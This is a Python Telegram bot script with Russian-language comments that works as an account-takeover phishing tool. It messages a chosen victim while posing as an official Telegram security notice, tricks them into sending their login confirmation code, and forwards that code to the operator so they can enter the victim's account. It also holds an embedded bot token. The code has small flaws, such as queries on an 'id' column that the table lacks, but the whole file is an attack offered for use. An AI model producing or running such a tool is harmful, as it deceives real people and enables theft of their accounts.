import telebot
import time
import sqlite3
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ТВОИ ДАННЫЕ
BOT_TOKEN = '8417861367:AAHqaOm1aE5uDBCmLo6AqalwZ2bCxivrsOA'  # твой токен
ADMIN_ID = ТВОЙ_ID  # твой chat_id

bot = telebot.TeleBot(BOT_TOKEN)

# База данных
conn = sqlite3.connect('attacks.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS attacks
                  (victim_id INTEGER PRIMARY KEY AUTOINCREMENT,
                   phone TEXT,
                   victim_user_id INTEGER,
                   code TEXT,
                   status TEXT,
                   timestamp TEXT)''')
conn.commit()

# Словарь для временных данных
attack_data = {}

# ========== КОМАНДЫ ДЛЯ АДМИНА (ТЕБЯ) ==========

@bot.message_handler(commands=['start'])
def admin_start(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    markup = InlineKeyboardMarkup()
    btn1 = InlineKeyboardButton("🎯 Новая атака", callback_data="new_attack")
    btn2 = InlineKeyboardButton("📊 Активные атаки", callback_data="list_attacks")
    markup.add(btn1, btn2)
    
    bot.send_message(
        ADMIN_ID,
        "🔐 *Панель управления атаками*\n\n"
        "Выберите действие:",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.from_user.id == ADMIN_ID)
def admin_callback(call):
    if call.data == "new_attack":
        # Просим ввести номер жертвы
        msg = bot.send_message(
            ADMIN_ID,
            "📱 Введите номер жертвы в международном формате:\n"
            "Например: +79161234567",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, process_attack_number)
    
    elif call.data == "list_attacks":
        show_active_attacks()

def process_attack_number(message):
    """Ты ввел номер жертвы"""
    phone = message.text
    
    # Сохраняем номер для атаки
    attack_data['target_phone'] = phone
    attack_data['step'] = 'waiting_username'
    
    # Просим username (чтобы отправить сообщение)
    msg = bot.send_message(
        ADMIN_ID,
        f"📱 Номер: {phone}\n\n"
        f"Введите username жертвы (если знаете):\n"
        f"Например: @ivanov\n\n"
        f"Если не знаете - отправьте 0",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, process_username)

def process_username(message):
    """Ты ввел username или 0"""
    username = message.text
    phone = attack_data.get('target_phone')
    
    if username != '0':
        # Пытаемся найти пользователя по username
        try:
            user_info = bot.get_chat(username)
            victim_user_id = user_info.id
            
            # Сохраняем в базу
            cursor.execute(
                "INSERT INTO attacks (phone, victim_user_id, status, timestamp) VALUES (?, ?, ?, ?)",
                (phone, victim_user_id, 'message_sent', time.ctime())
            )
            conn.commit()
            attack_id = cursor.lastrowid
            
            # Отправляем сообщение жертве
            send_phishing_message(victim_user_id, phone, attack_id)
            
            bot.send_message(
                ADMIN_ID,
                f"✅ Сообщение отправлено пользователю {username}\n"
                f"ID атаки: {attack_id}\n\n"
                f"Теперь пытайся войти в аккаунт жертвы!\n"
                f"Когда получишь код - жми /getcode {attack_id}",
                parse_mode="Markdown"
            )
            
        except Exception as e:
            bot.send_message(
                ADMIN_ID,
                f"❌ Не удалось найти пользователя: {e}\n"
                f"Попробуй другой username или отправь 0"
            )
    else:
        # Без username - ждем пока жертва сама напишет
        bot.send_message(
            ADMIN_ID,
            f"⚠️ Режим ожидания...\n"
            f"Номер: {phone}\n\n"
            f"Отправь жертве ссылку на бота:\n"
            f"https://t.me/твой_бот\n\n"
            f"Когда она напишет - я пришлю уведомление!"
        )

def send_phishing_message(user_id, phone, attack_id):
    """Отправляем фишинговое сообщение жертве"""
    
    markup = InlineKeyboardMarkup()
    btn = InlineKeyboardButton("✅ Это мой номер", callback_data=f"confirm_{attack_id}")
    markup.add(btn)
    
    try:
        bot.send_message(
            user_id,
            "🔐 *Официальное уведомление Telegram*\n\n"
            "Зафиксирована попытка входа в ваш аккаунт.\n"
            f"📱 Номер: {phone}\n"
            f"🕐 Время: {time.ctime()}\n"
            f"📍 Устройство: iPhone 13\n\n"
            "Если это вы - нажмите кнопку подтверждения.\n"
            "Если нет - проигнорируйте сообщение.",
            parse_mode="Markdown",
            reply_markup=markup
        )
        return True
    except:
        return False

# ========== ОБРАБОТКА ДЕЙСТВИЙ ЖЕРТВЫ ==========

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_'))
def victim_confirmed(call):
    """Жертва нажала кнопку подтверждения"""
    victim_id = call.from_user.id
    attack_id = int(call.data.replace('confirm_', ''))
    
    # Обновляем статус атаки
    cursor.execute(
        "UPDATE attacks SET status = 'waiting_code', victim_user_id = ? WHERE id = ?",
        (victim_id, attack_id)
    )
    conn.commit()
    
    # Просим ввести номер (для подтверждения)
    msg = bot.send_message(
        victim_id,
        "📱 Для подтверждения введите ваш номер телефона:\n"
        "`+79161234567`",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, victim_enter_phone, attack_id)

def victim_enter_phone(message, attack_id):
    """Жертва ввела номер"""
    phone = message.text
    
    # Обновляем номер в базе
    cursor.execute(
        "UPDATE attacks SET phone = ?, status = 'waiting_code' WHERE id = ?",
        (phone, attack_id)
    )
    conn.commit()
    
    bot.send_message(
        message.chat.id,
        "📨 Сейчас на ваш Telegram придет код подтверждения.\n"
        "Как только получите - отправьте его сюда."
    )
    
    # Уведомляем админа
    bot.send_message(
        ADMIN_ID,
        f"👤 *Жертва готова!*\n"
        f"ID атаки: {attack_id}\n"
        f"Телефон: {phone}\n\n"
        f"Теперь пытайся войти в аккаунт!\n"
        f"Когда получишь код - жми /getcode {attack_id}",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: True)
def victim_send_code(message):
    """Жертва отправляет код"""
    # Проверяем, есть ли активная атака для этого пользователя
    cursor.execute(
        "SELECT id FROM attacks WHERE victim_user_id = ? AND status = 'waiting_code'",
        (message.from_user.id,)
    )
    attack = cursor.fetchone()
    
    if attack and message.text and message.text.isdigit() and len(message.text) <= 6:
        attack_id = attack[0]
        code = message.text
        
        # Сохраняем код
        cursor.execute(
            "UPDATE attacks SET code = ?, status = 'code_received' WHERE id = ?",
            (code, attack_id)
        )
        conn.commit()
        
        # Кнопка подтверждения
        markup = InlineKeyboardMarkup()
        btn = InlineKeyboardButton("✅ Подтвердить код", callback_data=f"approve_{attack_id}")
        markup.add(btn)
        
        bot.send_message(
            message.chat.id,
            f"🔐 Код: {code}\n\n"
            f"Это ваш код? Нажмите подтвердить.",
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith('approve_'))
def victim_approve_code(call):
    """Жертва подтвердила код"""
    attack_id = int(call.data.replace('approve_', ''))
    
    # Получаем код из базы
    cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
    code, phone = cursor.fetchone()
    
    # Отправляем код админу (ТЕБЕ!)
    bot.send_message(
        ADMIN_ID,
        f"🔥 *КОД ПОЛУЧЕН!*\n\n"
        f"🎯 ID атаки: {attack_id}\n"
        f"📞 Телефон: {phone}\n"
        f"🔑 Код: `{code}`\n"
        f"⏰ Время: {time.ctime()}\n\n"
        f"Введи этот код в Telegram и войди в аккаунт!",
        parse_mode="Markdown"
    )
    
    # Подтверждаем жертве
    bot.send_message(
        call.message.chat.id,
        "✅ Код подтвержден! Доступ восстановлен."
    )
    
    # Обновляем статус
    cursor.execute("UPDATE attacks SET status = 'completed' WHERE id = ?", (attack_id,))
    conn.commit()

# ========== КОМАНДЫ ДЛЯ АДМИНА (ПОЛУЧЕНИЕ КОДА) ==========

@bot.message_handler(commands=['getcode'])
def admin_get_code(message):
    """Команда для принудительного получения кода"""
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        attack_id = int(message.text.split()[1])
        
        cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
        code, phone = cursor.fetchone()
        
        if code:
            bot.send_message(
                ADMIN_ID,
                f"🔑 Код для атаки {attack_id}:\n"
                f"Телефон: {phone}\n"
                f"Код: `{code}`",
                parse_mode="Markdown"
            )
        else:
            bot.send_message(ADMIN_ID, "Код еще не получен")
    except:
        bot.send_message(ADMIN_ID, "Использование: /getcode ID_АТАКИ")

def show_active_attacks():
    """Показать активные атаки"""
    cursor.execute(
        "SELECT id, phone, status, timestamp FROM attacks WHERE status != 'completed' ORDER BY id DESC"
    )
    attacks = cursor.fetchall()
    
    if not attacks:
        bot.send_message(ADMIN_ID, "Нет активных атак")
        return
    
    text = "📊 *Активные атаки:*\n\n"
    for a in attacks:
        status_emoji = {
            'message_sent': '📨',
            'waiting_code': '⏳',
            'code_received': '🔑'
        }.get(a[2], '❓')
        
        text += f"{status_emoji} ID: {a[0]} | {a[1]}\n"
        text += f"   Статус: {a[2]}\n"
        text += f"   Время: {a[3]}\n\n"
    
    bot.send_message(ADMIN_ID, text, parse_mode="Markdown")

print("🤖 Бот-перехватчик запущен!")
print(f"👤 Админ: {ADMIN_ID}")
print("🎯 Режим: ты вводишь номер → бот пишет жертве → ты получаешь код")
bot.polling()
